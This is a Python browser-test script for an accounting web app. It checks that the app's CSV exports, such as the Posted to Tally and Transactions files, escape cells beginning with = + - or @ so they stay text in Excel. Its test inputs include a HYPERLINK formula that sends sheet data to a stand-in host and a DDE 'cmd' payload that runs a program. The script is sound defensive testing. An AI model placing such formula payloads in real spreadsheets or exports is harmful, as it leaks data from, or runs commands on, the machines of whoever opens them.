"""python3 run_csv_formula.py - a CSV that FinCom saves never carries a formula (security review of 26-Oct-2026, B2).
A party, a narration or a bill number comes from Tally, a bank statement or a bill read by the AI; one that begins with
= + - or @ is a formula when the CSV is opened in Excel (=HYPERLINK(...) to send the sheet away, =cmd|... on an old
Excel). Every CSV writer (the TDS register, the bank statement, the sales register, Transactions, Posted to Tally) keeps
such a text as text: a ' before it. Numbers, negative amounts among them, stay numbers.
Run on the React build: TDSDESK_SITE=../app/dist-test python3 run_csv_formula.py"""
import os, threading, functools, http.server
os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/opt/pw-browsers")
from playwright.sync_api import sync_playwright
H = functools.partial(http.server.SimpleHTTPRequestHandler, directory=os.environ.get("TDSDESK_SITE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app", "dist-test"))); H.log_message = lambda *a: None
srv = http.server.ThreadingHTTPServer(("localhost", 8172), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
fails, errors = [], []
def ok(c, w):
    print(("  ok   " if c else "  FAIL ") + w)
    if not c: fails.append(w)
F = ['=HYPERLINK("http://evil.example/?"&A1,"Click")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1+1)"]
with sync_playwright() as p:
    br = p.chromium.launch(); pg = br.new_page(); pg.on("pageerror", lambda e: errors.append(str(e)))
    pg.add_init_script("""window.__csv = []; window.saveFile = async (name, data) => { window.__csv.push([name, typeof data === "string" ? data : await data.text()]); };""")
    pg.goto("http://localhost:8172/"); pg.wait_for_timeout(2500); pg.evaluate("() => new Promise((r) => { const go = () => (typeof doAct === 'function' && typeof signInNeeded === 'function' && typeof S === 'object' && S && S.firm) ? (() => { try { if (signInNeeded()) doAct('useOffline'); } finally { r(); } })() : setTimeout(go, 50); go(); })"); pg.wait_for_timeout(800)
    pg.evaluate("() => { window.saveFile = async (name, data) => { window.__csv.push([name, typeof data === 'string' ? data : await data.text()]); }; }")
    # the cell writer every register uses, and the two writers of their own (Transactions; Posted to Tally)
    cells = pg.evaluate("(F) => F.map(csvCell).concat([csvCell(-1500), csvCell('-1500.00'), csvCell('Asha Rao'), csvCell('2026-05-31')])", F)
    ok(all(c.lstrip('"').startswith("'") for c in cells[:4]), "csvCell: a text that begins with = + - @ is kept as text " + str(cells[:4]))
    ok(cells[4:] == ["-1500", "-1500.00", "Asha Rao", "2026-05-31"], "csvCell: numbers, negative amounts and plain text unchanged " + str(cells[4:]))
    pg.evaluate("""async (F) => { S.firm.postLog = F.map((f, i) => ({at: "2026-10-26", what: "bill", action: "create", ref: f, party: f, amount: -100 * (i + 1), tally: {vchType: "Purchase", masterId: "1", company: f}, by: f}));
      await postLogCsv(); }""", F)
    pg.wait_for_timeout(300)
    out = pg.evaluate("window.__csv")
    log = [t for n, t in out if n.startswith("posted-to-tally")]
    import csv, io
    def cells_of(t): return [c for row in csv.reader(io.StringIO(t.lstrip("﻿"))) for c in row]
    bad = lambda t: [c for c in cells_of(t) if c and (c[0] in "=+@" or (c[0] == "-" and not c.lstrip("-").replace(".", "").isdigit()))]
    ok(log and not bad(log[0]), "Posted to Tally CSV: no cell begins a formula " + str(bad(log[0])[:3] if log else "no file"))
    ok(log and "'=HYPERLINK" in log[0] and "-100" in log[0], "Posted to Tally CSV: the text kept with a ', the amounts as numbers")
    # Transactions (bills): a bill whose party and number a file or the AI gave
    pg.evaluate("""async (F) => { const co = newCompany({name: "CSV Co", gstin: "27AAACB1234C1Z5"}); co.id = "c_csv"; S.companies[co.id] = co; S.data[co.id] = {parties: {}, entries: {}, loaded: true};
      await openCompany(co.id); F.forEach((f, i) => { const e = newEntry(f + ".pdf"); e.id = "e_csv" + i; e.status = "draft";
        e.x = Object.assign(e.x || {}, {vendorName: f, invoiceNo: f, invoiceDate: "2026-05-0" + (i + 1), totalAmount: 100, taxable: 100}); D().entries[e.id] = e; });
      S.tab = "txn"; S.txnTab = "bills"; render(); window.__csv = []; await txnCsv(); }""", F)
    pg.wait_for_timeout(500)
    tx = [t for n, t in pg.evaluate("window.__csv") if n.endswith(".csv")]
    ok(tx and not bad(tx[0]), "Transactions CSV: no cell begins a formula " + str(bad(tx[0])[:3] if tx else "no file"))
    ok(tx and any(F[0] in c for c in cells_of(tx[0])), "Transactions CSV: the party is still in it, as text")
    ok(not errors, "no page errors " + str(errors[:3]))
    br.close()
print(("%d failed" % len(fails)) if fails else "all passed")
raise SystemExit(1 if fails else 0)
